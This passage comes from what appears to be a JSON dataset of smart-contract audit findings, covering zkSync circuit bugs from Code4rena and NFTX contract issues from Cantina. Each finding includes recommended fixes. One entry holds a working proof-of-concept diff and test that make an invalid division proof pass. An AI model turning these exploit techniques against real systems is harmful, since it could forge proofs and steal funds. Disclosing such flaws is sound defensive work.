Warden has shown how, due to an unnecessary read, an attacker can perform an arbitrary read from memory, manipulating the value of `dst0_value`.\n\n***\n\n",
      "summary": "\nThe bug report discusses a problem with a current implementation that allows an attacker to manipulate a value, leading to an arbitrary read from memory. The issue occurs when attempting to read a word that spans across the pointer bound start + offset, and when the offset is greater than or equal to the length. This results in the read not being handled properly, allowing an attacker to forge the read result. The recommended mitigation step is to set the bytes_to_cleanup_out_of_bounds value to 32 when skip_if_legitimate_fat_ptr is used. The bug has been confirmed by a member of the zkSync team and assessed by a judge.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/702",
      "tags": [],
      "finders": [
        "xuwinnie"
      ]
    },
    {
      "id": "30275",
      "title": "[H-02] Attacker can manipulate the sorted queue in log sorter to emit reverted logs and events",
      "impact": "HIGH",
      "content": "\nAttacker can manipulate the sorted queue in log sorter, as constraints are not strong enough and reverted l1 logs and events can still be emitted.\n\n### Proof of Concept\n\nLet's see what we have enforced in this circuit. For a unique timestamp, either there is only a write log, we should add it to the queue; or there is a write log and a rollback log, which means revert took place, we should ignore it.\n\n            // We compare timestamps, and then resolve logic over rollbacks, so the only way when\n            // keys are equal can be when we do rollback\n            let sorting_key = sorted_item.timestamp;\n\n            // ensure sorting for uniqueness timestamp and rollback flag\n            // We know that timestamps are unique across logs, and are also the same between write and rollback\n            let (keys_are_equal, new_key_is_smaller) =\n                unpacked_long_comparison(cs, &[previous_key], &[sorting_key]);\n\n            // keys are always ordered no matter what, and are never equal unless it's padding\n            new_key_is_smaller.conditionally_enforce_false(cs, should_pop);\n\nAt first, we enforce the timestamps in the sorted queue are in ascending orders, which means write log and rollback log of the same timestamp should be adjacent.\n\n            // there are only two cases when keys are equal:\n            // - it's a padding element\n            // - it's a rollback\n\n            // it's enough to compare timestamps as VM circuit guarantees uniqueness of the if it's not a padding\n            let previous_is_not_rollback = previous_item.rollback.negated(cs);\n            let enforce_sequential_rollback = Boolean::multi_and(\n                cs,\n                &[previous_is_not_rollback, sorted_item.rollback, should_pop],\n            );\n            keys_are_equal.conditionally_enforce_true(cs, enforce_sequential_rollback);\n\nHere, for two consecutive element A, B in the queue, if A is not rollback and B is rollback, we enforce that A, B shares the same timestamp.\n\n            let same_log = UInt32::equals(cs, &sorted_item.timestamp, &previous_item.timestamp);\n            let values_are_equal =\n                UInt256::equals(cs, &sorted_item.written_value, &previous_item.written_value);\n            let negate_previous_is_trivial = previous_is_trivial.negated(cs);\n            let should_enforce = Boolean::multi_and(cs, &[same_log, negate_previous_is_trivial]);\n            values_are_equal.conditionally_enforce_true(cs, should_enforce);\n\nHere, for two consecutive element A, B in the queue, if they share the same timestamp, we enforce that they have the same written value. (This is already guaranteed by the earlier circuits).\n\n            let this_item_is_non_trivial_rollback =\n                Boolean::multi_and(cs, &[sorted_item.rollback, should_pop]);\n            let negate_previous_item_rollback = previous_item.rollback.negated(cs);\n            let prevous_item_is_non_trivial_write = Boolean::multi_and(\n                cs,\n                &[negate_previous_item_rollback, negate_previous_is_trivial],\n            );\n            let is_sequential_rollback = Boolean::multi_and(\n                cs,\n                &[\n                    this_item_is_non_trivial_rollback,\n                    prevous_item_is_non_trivial_write,\n                ],\n            );\n            same_log.conditionally_enforce_true(cs, is_sequential_rollback);\n\nThis is almost the same as the second one.\n\n            // decide if we should add the PREVIOUS into the queue\n            // We add only if previous one is not trivial,\n            // and it had a different key, and it wasn't rolled back\n            let negate_same_log = same_log.and(cs, should_pop).negated(cs);\n            let add_to_the_queue = Boolean::multi_and(\n                cs,\n                &[\n                    negate_previous_is_trivial,\n                    negate_same_log,\n                    negate_previous_item_rollback,\n                ],\n            );\n\nFinally, for two consecutive element A, B in the queue, if A is write and A, B are different, we add A to the result queue.\n\nWe use `w` to denote write and `r` to denote rollback, two adjacent letters share the same timestamp. An ideal sorted queue would be like `wr wr w w w wr`. The system worked well in this case. However, what if someone submit `wr rw wr rw` as the sorted queue? All the four logs here are reverted, so no log should be added to the result queue. However, this sorted queue satisfy all the constraints, and it will add the second and the fourth log to the result queue.\n\nTo conclude, the constraints are not strong enough and attacker can manipulate the sorted queue to emit already reverted l1 logs and events.\n\n### Recommended Mitigation Steps\n\nEnforce that the first popped element is write and there are no two consecutive rollbacks in the sorted queue.\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/761#issuecomment-1794576350)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/761#issuecomment-1829756434):**\n > The Warden has demonstrated a lack of constraints that would allow, per their own words to:\n> > manipulate the sorted queue to emit already reverted l1 logs and events.\n> \n> This allows for undefined behaviour, which may lead to exploits, leading me to believe that High severity is appropriate.\n\n***\n\n",
      "summary": "\nThe bug report highlights a vulnerability in the log sorter of the system. The attacker can manipulate the sorted queue and emit already reverted logs and events. This is due to weak constraints in the circuit, which allows for undefined behavior and potential exploits. It is recommended to enforce stronger constraints to prevent this vulnerability. The severity of this bug is considered to be high.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/761",
      "tags": [],
      "finders": [
        "xuwinnie"
      ]
    },
    {
      "id": "30274",
      "title": "[H-01] Missing range constraint on remainder check in `div` opcode implementation",
      "impact": "HIGH",
      "content": "\nWhen calculating the remainder of the `div` instruction, the circuit needs to verify that the remainder is less than the divisor. It does this by subtracting the divisor from the remainder and enforcing that the borrow flow is true.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/era-zkevm_circuits/src/main_vm/opcodes/mul_div.rs#L314>\n\n```rust\n// do remainder - divisor\nlet (subtraction_result_unchecked, remainder_is_less_than_divisor) =\n    allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);\n\n// relation is a + b == c + of * 2^N,\n// but we compute d - e + 2^N * borrow = f\n\n// so we need to shuffle\nlet addition_relation = AddSubRelation {\n    a: *src1_view,\n    b: subtraction_result_unchecked,\n    c: remainder_unchecked,\n    of: remainder_is_less_than_divisor,\n};\n\n// unless divisor is 0 (that we handle separately),\n// we require that remainder is < divisor\nremainder_is_less_than_divisor.conditionally_enforce_true(cs, divisor_is_non_zero);\n```\n\nHowever, the code fails to range constrain the result of the subtraction. This allows `subtraction_result_unchecked` to contain limbs that are not representable by a 32-bit unsigned integer. We can use this to force `remainder_is_less_than_divisor` to be true even if the remainder is actually larger than the divisor.\n\n### Impact\n\nA malicious validator could generate and submit a proof with incorrect behavior of the `div` instruction. This would allow the validator to manipulate the behavior of smart contracts that use a `div` instruction. For example, the validator could manipulate the calculated price during the execution of an on-chain DEX and steal all of the assets in the DEX. Since every smart contract that uses a `div` instruction is affected, it is impossible to enumerate all potential impacts.\n\n### Proof of Concept\n\nFor the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code: <https://github.com/chainlight-io/zksync-era-boojum-test-harness>. The patch below can be applied to the test code to demonstrate the vulnerability:\n\n<details>\n\n```diff\ndiff --git a/run.sh b/run.sh\nindex 91e97da..97e2d3b 100644\n--- a/run.sh\n+++ b/run.sh\n@@ -1,2 +1,3 @@\n #!/bin/sh\n-cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 -- --nocapture run_simple\n+# XXX must run as release to avoid debug asserts\n+cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_simple && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_hack\ndiff --git a/zk_evm/src/opcodes/execution/div.rs b/zk_evm/src/opcodes/execution/div.rs\nindex f09d9b9..4e786d3 100644\n--- a/zk_evm/src/opcodes/execution/div.rs\n+++ b/zk_evm/src/opcodes/execution/div.rs\n@@ -48,7 +48,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {\n             );\n             vm_state.perform_dst1_update(PrimitiveValue::empty(), self.dst1_reg_idx);\n         } else {\n-            let (q, r) = src0.div_mod(src1);\n+            let (q, r) = if src0 == U256::from(1337u32) {\n+                (U256::zero(), src0)\n+            } else {\n+                src0.div_mod(src1)\n+            };\n             if set_flags {\n                 let eq = q.is_zero();\n                 let gt = r.is_zero();\ndiff --git a/zkevm_circuits/src/main_vm/opcodes/add_sub.rs b/zkevm_circuits/src/main_vm/opcodes/add_sub.rs\nindex f7c4d0b..418e5ef 100644\n--- a/zkevm_circuits/src/main_vm/opcodes/add_sub.rs\n+++ b/zkevm_circuits/src/main_vm/opcodes/add_sub.rs\n@@ -272,3 +272,66 @@ pub fn allocate_subtraction_result_unchecked<F: SmallField, CS: ConstraintSystem\n \n     (limbs, of)\n }\n+\n+pub fn allocate_subtraction_result_unchecked_hack<F: SmallField, CS: ConstraintSystem<F>>(\n+    cs: &mut CS,\n+    a: &[UInt32<F>; 8],\n+    b: &[UInt32<F>; 8],\n+) -> ([UInt32<F>; 8], Boolean<F>) {\n+    let limbs = cs.alloc_multiple_variables_without_values::<8>();\n+    let of = cs.alloc_variable_without_value();\n+\n+    if <CS::Config as CSConfig>::WitnessConfig::EVALUATE_WITNESS {\n+        let value_fn = move |inputs: [F; 16]| {\n+            let mut uf = false;\n+            let mut result = [F::ZERO; 9];\n+            for (idx, (a, b)) in inputs[..8].iter().zip(inputs[8..].iter()).enumerate() {\n+                let a = <u32 as WitnessCastable<F, F>>::cast_from_source(*a);\n+                let b = <u32 as WitnessCastable<F, F>>::cast_from_source(*b);\n+                let (c, new_uf_0) = (a).overflowing_sub(b);\n+                let (c, new_uf_1) = c.overflowing_sub(uf as u32);\n+\n+                uf = new_uf_0 || new_uf_1;\n+\n+                result[idx] = F::from_u64_unchecked(c as u64);\n+            }\n+\n+            result[8] = F::from_u64_unchecked(uf as u64);\n+\n+            if inputs[0].as_u64() == 1337 {\n+                result[7] = F::from_u64_unchecked(1<<32);\n+                result[8] = F::from_u64_unchecked(1);\n+            }\n+\n+            result\n+        };\n+\n+        let dependencies = Place::from_variables([\n+            a[0].get_variable(),\n+            a[1].get_variable(),\n+            a[2].get_variable(),\n+            a[3].get_variable(),\n+            a[4].get_variable(),\n+            a[5].get_variable(),\n+            a[6].get_variable(),\n+            a[7].get_variable(),\n+            b[0].get_variable(),\n+            b[1].get_variable(),\n+            b[2].get_variable(),\n+            b[3].get_variable(),\n+            b[4].get_variable(),\n+            b[5].get_variable(),\n+            b[6].get_variable(),\n+            b[7].get_variable(),\n+        ]);\n+        let outputs = Place::from_variables([\n+            limbs[0], limbs[1], limbs[2], limbs[3], limbs[4], limbs[5], limbs[6], limbs[7], of,\n+        ]);\n+        cs.set_values_with_dependencies(&dependencies, &outputs, value_fn);\n+    }\n+\n+    let limbs = limbs.map(|el| unsafe { UInt32::from_variable_unchecked(el) });\n+    let of = unsafe { Boolean::from_variable_unchecked(of) };\n+\n+    (limbs, of)\n+}\ndiff --git a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\nindex dbfbeb3..ffecb7a 100644\n--- a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\n+++ b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\n@@ -101,7 +101,9 @@ pub fn allocate_div_result_unchecked<F: SmallField, CS: ConstraintSystem<F>>(\n             let a = allocate_u256_from_limbs(&inputs[0..8]);\n             let b = allocate_u256_from_limbs(&inputs[8..16]);\n \n-            let (quotient, remainder) = if b.is_zero() {\n+            let (quotient, remainder) = if b == U256::from(1337u32) {\n+                (U256::zero(), b)\n+            } else if b.is_zero() {\n                 (U256::zero(), U256::zero())\n             } else {\n                 a.div_mod(b)\n@@ -313,7 +315,7 @@ pub(crate) fn apply_mul_div<F: SmallField, CS: ConstraintSystem<F>>(\n \n     // do remainder - divisor\n     let (subtraction_result_unchecked, remainder_is_less_than_divisor) =\n-        allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);\n+        allocate_subtraction_result_unchecked_hack(cs, &remainder_unchecked, src1_view);\n \n     // relation is a + b == c + of * 2^N,\n     // but we compute d - e + 2^N * borrow = f\ndiff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rs\nindex 76ac16c..f4e184d 100644\n--- a/zkevm_test_harness/src/tests/run_manually.rs\n+++ b/zkevm_test_harness/src/tests/run_manually.rs\n@@ -41,6 +41,43 @@ fn run_simple() {\n         log.event.first r1, r2, r0\n         log.to_l1.first r1, r2, r0\n \n+        add 1336, r0, r1\n+        div r1, r1, r2, r3\n+        add 1, r0, r4\n+        sstore r2, r4\n+        add 2, r0, r4\n+        sstore r3, r4\n+\n+        ret.ok r0\n+    \"#;\n+\n+    run_and_try_create_witness_inner(asm, 50);\n+}\n+\n+#[test]\n+fn run_hack() {\n+    let asm = r#\"\n+        .text\n+        .file\t\"Test_26\"\n+        .rodata.cst32\n+        .p2align\t5\n+        .text\n+        .globl\t__entry\n+    __entry:\n+    .main:\n+        add 1, r0, r1\n+        add 2, r0, r2\n+        sstore r1, r2\n+        log.event.first r1, r2, r0\n+        log.to_l1.first r1, r2, r0\n+\n+        add 1337, r0, r1\n+        div r1, r1, r2, r3\n+        add 1, r0, r4\n+        sstore r2, r4\n+        add 2, r0, r4\n+        sstore r3, r4\n+\n         ret.ok r0\n     \"#;\n```\n\n</details>\n\nWe demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value `1337` is in a source operand. There are two tests that will run: source value of `1336` to show the normal behavior, and source value of `1337` to show the vulnerable behavior.\n\nThe relevant output of `run.sh` is the VM registers during the execution trace and is included below:\n\n    Made snapshot at cycle 1029\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336 <-- dividend and divisor\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 1 <-- quotient\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0 <-- remainder\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    ...\n\n    Made snapshot at cycle 1029\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337 <-- dividend and divisor\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 0 <-- quotient\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 1337 <-- remainder\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    ...\n\nWe see that the result of the `div` instruction in the normal example is as expected: `1336 / 1336 = 1`. However, in the vulnerable example, the result is incorrect: `1337 / 1337 = 1337`. While we chose to set the result to the same value as the source operand, it could be other values as well.\n\n### Recommended Mitigation Steps\n\nThe `subtraction_result_unchecked` variable should be range constrained. An example fix might look like:\n\n```rust\nlet (subtraction_result_unchecked, remainder_is_less_than_divisor) =\n    allocate_subtraction_result_unchecked(cs, &remainder_unchecked, src1_view);\nlet subtraction_result = subtraction_result_unchecked.map(|el| UInt32::from_variable_checked(cs, el.get_variable()));\n```\n\n**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/1133#issuecomment-1794470400)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/1133#issuecomment-1830116562):**\n > The Warden has shown and weaponized a lack of a constraint in the `div` opcode, which has been weaponized to pass an invalid proof.\n\n***\n\n",
      "summary": "\nSummary: \nThe bug report describes a vulnerability in the `div` instruction of the zkSync Era test harness. The code fails to range constrain the result of the subtraction, allowing for the possibility of manipulation of the `div` instruction's behavior. This could be exploited by a malicious validator to manipulate the behavior of smart contracts and potentially steal assets. The report includes a proof of concept and recommends fixing the issue by range constraining the `subtraction_result_unchecked` variable.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/1133",
      "tags": [],
      "finders": [
        "chainlight"
      ]
    },
    {
      "id": "54564",
      "title": "CreateVaultZap.createVault sets the caller to manager may compromise later users. ",
      "impact": "LOW",
      "content": "## CreateVaultZap Documentation\n\n## Context\n`CreateVaultZap.sol#L238-L252`\n\n## Description\nThe `CreateVaultZap.createVault` function is responsible for creating the Vault and calls `setVaultFeatures` and `setFees` to initialize the settings. At the end of the function, it assigns the caller as the manager.\n\n```solidity\nif (params.vaultFeaturesFlag < 7) {\n    vault.setVaultFeatures(\n        _getBoolean(params.vaultFeaturesFlag, 2),\n        _getBoolean(params.vaultFeaturesFlag, 1),\n        _getBoolean(params.vaultFeaturesFlag, 0)\n    );\n}\nvault.setFees(\n    params.vaultFees.mintFee,\n    params.vaultFees.redeemFee,\n    params.vaultFees.swapFee\n);\nvault.setManager(msg.sender);\n```\n\nHowever, maintaining the caller's manager privileges might jeopardize the interests of future users. \n\n### Consider the following scenario:\n- Alice creates a Vault and deposits 10 NFTs.\n- Bob deposits 5 NFTs into the Vault. \n- Since Alice retains manager privileges, she can call `setFees` to impose a higher fee or call `setVaultFeatures` to prevent Bob from redeeming his NFTs after she redeems hers.\n\nAlthough `Factory.createVault` also encounters this issue, it's crucial to standardize the behavior of `CreateVaultZap.createVault` as it serves as the more universal entry point.\n\n## Recommendation\nOnce the initialization process is complete, it is advisable to call `finalizeVault` in order to revoke the manager privileges.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54563",
      "title": "Events coverage, conﬁguration checks, variable naming ",
      "impact": "LOW",
      "content": "## Code Review Recommendations\n\n## Context\n- **MarketplaceUniversalRouterZap.sol**: Lines 58-98, 433-449\n- **NFTXVaultUpgradeableV3.sol**: Lines 140-150\n- **NFTXRouter.sol**: Lines 423-424\n\n## Description\nEvents can be added and expanded/indexed/fixed, and names updated per recommendations below.\n\n## Recommendation\n\n1. **Consider adding the asset address or v3 vault id to the events:**\n   - **MarketplaceUniversalRouterZap.sol**: Lines 58-98\n     ```solidity\n     /// @param count The number of tokens affected by the event\n     /// @param ethReceived The amount of ETH received in the sell\n     /// @param to The user affected by the event\n     /// @param netRoyaltyAmount The royalty amount sent\n     /// @param wethFees Vault fees paid\n     event Sell(\n         uint256 count,\n         uint256 ethReceived,\n         address to,\n         uint256 netRoyaltyAmount,\n         uint256 wethFees\n     );\n     ```\n\n   - **Event Swap**: \n     ```solidity\n     /// @param ethSpent The amount of ETH spent in the swap\n     /// @param to The user affected by the event\n     event Swap(uint256[] idsIn, uint256[] idsOut, uint256 ethSpent, address to);\n     ```\n\n     Updated event:\n     ```solidity\n     event Swap(\n         uint256[] idsIn,\n         uint256[] amounts,\n         uint256[] idsOut,\n         uint256 ethSpent,\n         address to\n     );\n     ```\n\n   - **Event Buy**:\n     ```solidity\n     /// @param nftIds The nftIds bought\n     /// @param ethSpent The amount of ETH spent in the buy\n     /// @param to The user affected by the event\n     /// @param netRoyaltyAmount The royalty amount sent\n     event Buy(\n         uint256[] nftIds,\n         uint256 ethSpent,\n         address to,\n         uint256 netRoyaltyAmount\n     );\n     ```\n\n   - **Event DustReturned**:\n     ```solidity\n     /// @notice Emitted when dust is returned after a transaction.\n     /// @param ethAmount Amount of ETH returned to user\n     /// @param vTokenAmount Amount of vToken returned to user\n     /// @param to The user affected by the event\n     event DustReturned(uint256 ethAmount, uint256 vTokenAmount, address to);\n     ```\n\n   Also, the key parameters, e.g., asset and `to` addresses, can be indexed.\n\n2. **Consider emitting events in all three functions as they are material:**\n   - **MarketplaceUniversalRouterZap.sol**: Lines 433-449\n     ```solidity\n     /**\n      * @notice Allows our zap to be paused to prevent any processing.\n      *\n      * @param paused_ New pause state\n      */\n     function pause(bool paused_) external onlyOwner {\n         paused = paused_;\n     }\n\n     function setUniversalRouter(address universalRouter_) external onlyOwner {\n         universalRouter = universalRouter_;\n     }\n\n     function setDustThreshold(uint256 dustThreshold_) external onlyOwner {\n         dustThreshold = dustThreshold_;\n     }\n     ```\n\n   Also, a zero address check for `universalRouter_` and boundary checks for `dustThreshold_` are advised.\n\n3. **Consider renaming `emptyAmounts` for better clarity**:\n   - **NFTXVaultUpgradeableV3.sol**: Lines 140-150\n     ```solidity\n     function mint(\n         uint256[] calldata tokenIds,\n         uint256[] calldata amounts,\n         address depositor,\n         address to\n     ) external payable override nonReentrant returns (uint256 vTokensMinted) {\n         _onlyOwnerIfPaused(1);\n         if (!enableMint) revert MintingDisabled();\n         // Take the NFTs.\n         uint256 nftCount = _receiveNFTs(depositor, tokenIds, amounts);\n     }\n     ```\n\n4. **Introduce events for key actions in `MigratorZap` and `CreateVaultZap` (currently, there are none).**\n\n5. **Correct token count for ERC1155 in `NFTXRouter`:**\n   - **SellNFTs uses wrong token count**:\n     ```solidity\n     uint256 nftCount = !vToken.is1155()\n         ? params.nftIds.length\n         : _sum1155Ids(params.nftIds, params.nftAmounts);\n     ```\n\n     Current event:\n     ```solidity\n     event SellNFTs(uint256 nftCount, uint256 ethReceived);\n     ```\n   \n   Update emitting event:\n   ```solidity\n   emit SellNFTs(nftCount, wethRemaining);\n   ``` \n\n   ***Correction:***\n   Previously:\n   ```solidity\n   emit SellNFTs(params.nftIds.length, wethRemaining);\n   ``` \n   Corrected:\n   ```solidity\n   emit SellNFTs(nftCount, wethRemaining);\n   ```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54562",
      "title": "MigratorZap._v2ToV3Vault should limit the amount of VTokenV2 that is swapped ",
      "impact": "GAS",
      "content": "## MigratorZap.sol Overview\n\n## Context\n`MigratorZap.sol#L355-L375`\n\n## Description\nIn `MigratorZap._v2ToV3Vault`, unused VTokenV2s are swapped for ETH. Even if there is only 1 wei of VTokenV2, this may result in the user paying more in gas than the ETH swapped.\n\n```solidity\nvTokenV2Balance = vTokenV2Balance % 1 ether;\n// Sell fractional portion for WETH\nif (vTokenV2Balance > 0) {\n    address[] memory path = new address[](2);\n    path[0] = vTokenV2;\n    path[1] = address(WETH);\n    TransferLib.unSafeMaxApprove(\n        vTokenV2,\n        address(sushiRouter),\n        vTokenV2Balance\n    );\n    wethReceived = sushiRouter.swapExactTokensForTokens(\n        vTokenV2Balance,\n        minWethToReceive,\n        path,\n        address(this),\n        block.timestamp\n    )[path.length - 1];\n}\n```\n\n## Recommendation\nConsider limiting the swap with a value like `MINIMUM_INVENTORY_LIQUIDITY`, and when it is less than that, send it to the user instead of swapping it.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54561",
      "title": "MarketplaceUniversalRouterZap 's _sendETHResidue() doesn 't check for zero recipient, so residual ETH funds can be frozen ",
      "impact": "LOW",
      "content": "## MarketplaceUniversalRouterZap Vulnerability Analysis\n\n## Context\n- **File:** `MarketplaceUniversalRouterZap.sol`\n- **Line Number:** 702\n\n## Description\nWhen the `to` address is zero, the function `_sendETHResidue()` will permanently freeze the corresponding funds.\n\n```solidity\n// Code Reference \nMarketplaceUniversalRouterZap.sol#L700-L704\nfunction _sendETHResidue(address to) internal {\n    // sending entire ETH balance (hence accounting for the unused msg.value)\n    (bool success, ) = payable(to).call{value: address(this).balance}(\"\");\n    if (!success) revert UnableToSendETH();\n}\n```\n\nThe function `_sendETHResidue()` is invoked in all user-facing functions of `MarketplaceUniversalRouterZap` to handle the remainder of funds.\n\n## Impact\nThe current ETH balance of the contract will be burned if `to` is zero.\n\nGiven the very low likelihood but high impact, the severity is set to low.\n\n## Recommendation\nConsider implementing a check to prevent operational mistakes by disallowing the `to` address from being a zero address.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54560",
      "title": "MarketplaceUniversalRouterZap 's sell721() and sell1155() do not control the ongoing amount, failing with a low level error when there are not enouhg funds for fees and royalties ",
      "impact": "LOW",
      "content": "## Security Vulnerability Report\n\n## Context\n- `MarketplaceUniversalRouterZap.sol#L159-L166`\n- `MarketplaceUniversalRouterZap.sol#L353-L367`\n\n## Description\nBoth NFT selling functions of `MarketplaceUniversalRouterZap` execute fee and royalty deductions without amount checks and will fail with underflows when there is a lack of ongoing funds for any reason:\n\n### Function Call (Lines 159-166)\n```solidity\n_distributeVaultFees(vaultId, wethFees, true);\nuint256 netRoyaltyAmount;\nif (deductRoyalty) {\n    netRoyaltyAmount = _deductRoyalty(assetAddress, idsIn, wethAmount);\n}\nwethAmount -= (wethFees + netRoyaltyAmount); // if underflow, then revert desired\n```\n\n### Function Call (Lines 353-367)\n```solidity\n// Distributing vault fees with the weth received\nuint256 wethFees = _ethMintFees(INFTXVaultV3(vault), totalAmount);\n_distributeVaultFees(vaultId, wethFees, true);\nuint256 netRoyaltyAmount;\nif (deductRoyalty) {\n    netRoyaltyAmount = _deductRoyalty1155(\n        assetAddress,\n        idsIn,\n        amounts,\n        wethAmount\n    );\n}\nwethAmount -= (wethFees + netRoyaltyAmount); // if underflow, then revert desired\n```\n\n## Impact\nThe current logic can fail with a non-transparent low-level error, despite a clear business reason that can be communicated. This may interfere with integrations, making some programmatic usages of the protocol impossible. Given the medium likelihood and low impact, the severity is set to low.\n\n## Recommendation\nConsider introducing amount checks and the corresponding error handling before `_distributeVaultFees()` and `_deductRoyalty()`, so it is clear at what point the lack of funds state occurred.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cantina",
      "protocol_name": "NFTX",
      "source_link": "https://cdn.cantina.xyz/reports/cantina_nftx_aug2023.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "cccz",
        "hyh"
      ]
    },
    {
      "id": "54559",
      "title": "MarketplaceUniversalRouterZap 's swap1155() and _mint1155() allow for mistreating NFT type and freezing the tokens on the contract balance ",
      "impact": "MEDIUM",
      "content": "## Vulnerability Analysis: MarketplaceUniversalRouterZap.sol\n\n## Context\n- MarketplaceUniversalRouterZap.sol#L380-L410\n- MarketplaceUniversalRouterZap.sol#L521-L535\n\n## Description\nSimilarly to core protocol NFT type issue 70, there is a possibility for mistreating the type of the Vault, as both functions follow the ERC-1155 path, while the Vault can be ERC-721 and treat the supplied ids without reverting, but differently (e.g., with amounts fixed to be 1).\n\n### Code Snippet\n```solidity\nMarketplaceUniversalRouterZap.sol L380-L410\nfunction swap1155(\n...\n) external payable onlyOwnerIfPaused {\n    address vault = nftxVaultFactory.vault(vaultId);\n    address assetAddress = INFTXVaultV3(vault).assetAddress();\n    >> IERC1155(assetAddress).safeBatchTransferFrom(\n        msg.sender,\n        address(this),\n        idsIn,\n        amounts,\n        \"\"\n    );\n    IERC1155(assetAddress).setApprovalForAll(vault, true);\n    // Swap our tokens. Forcing to deduct vault fees\n    >> uint256 ethFees = INFTXVaultV3(vault).swap{value: msg.value}(\n        idsIn,\n        amounts,\n        idsOut,\n        msg.sender,\n        to,\n        vTokenPremiumLimit,\n        true\n    );\n}\n```\n\nAs an example, Bob the user can supply to `MarketplaceUniversalRouterZap` ERC-1155 3 NFTs, while Vault, being of ERC-721 type, will fetch only 1 of them, with the remaining 2 stuck in the contract.\n\n## Impact\nUser operational mistakes when dealing with NFTs supporting both ERC-1155 and ERC-721 can lead to permanent freeze of these tokens on the `MarketplaceUniversalRouterZap` balance. Given the low likelihood and high impact, the severity is set to medium.\n\n## Recommendation\nConsider directly controlling for the Vault type in `swap1155()` and `_mint1155()`, for example:\n\n### Code Snippet\n```solidity\nMarketplaceUniversalRouterZap.sol L380-L410\nfunction swap1155(\n...\n) external payable onlyOwnerIfPaused {\n    address vault = nftxVaultFactory.vault(vaultId);\n    + if (!INFTXVaultV3(vault).is1155()) revert WrongVaultType();\n    address assetAddress = INFTXVaultV3(vault).assetAddress();\n    IERC1155(assetAddress).safeBatchTransferFrom(\n        msg.sender,\n        address(this),\n        idsIn,\n        amounts,\n        \"\"\n    );\n    IERC1155(assetAddress).setApprovalForAll(vault, true);\n    // Swap our tokens. Forcing to deduct vault fees\n    uint256 ethFees = INFTXVaultV3(vault).swap{value: msg.value}(\n        idsIn,\n        